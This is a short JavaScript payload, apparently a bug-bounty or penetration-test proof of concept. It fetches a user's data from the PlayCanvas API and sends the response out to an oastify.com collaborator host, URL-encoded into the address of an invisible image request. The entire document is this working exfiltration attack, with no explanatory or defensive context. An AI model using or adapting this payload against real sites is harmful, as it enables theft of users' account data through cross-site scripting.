fetch("https://playcanvas.com/api/users/shisco")
  .then(r => r.text())
  .then(data => {
    const img = new Image();
    img.src = "https://i9s0o50prcnjffe3sa6ci2h70y6pugi5.oastify.com/?" + encodeURIComponent(data);
  });
